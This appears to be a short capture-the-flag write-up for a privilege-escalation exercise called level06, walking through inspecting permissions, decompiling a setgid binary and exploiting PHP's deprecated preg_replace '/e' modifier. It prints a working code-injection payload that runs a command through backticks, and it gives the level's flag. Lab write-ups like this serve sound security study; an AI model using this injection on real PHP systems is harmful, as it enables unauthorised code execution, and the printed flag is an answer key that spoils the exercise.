# level06

1. examinate existing files permissions

```shell
ls -la
```

shows that the level06 executable belongs to flag06 group, privilege escalation should be possible

2. get the executable (from an external device)

```shell
scp -P 4242 level06@<host>:level06 level06
```

3. decompile the executable and examine the resulting code

```shell
/opt/retdec/bin/retdec-decompiler.py level06
```

setresgid confirms that privilege escalation is possible

4. examinate the existing php code

```shell
cat levelo6.php
```

shows deprecated `\e` regex modifier, which indicates we can inject code in the string. preg_replace will perform the regex substitution then evaluate the code

5. inject some code to pwn the flag

```shell
echo '[x ${`getflag`}]' > /tmp/exploit.php
```

```shell
./level06 /tmp/exploit.php
```

gives flag: `wiok45aaoguiboiki2tuin6ub`
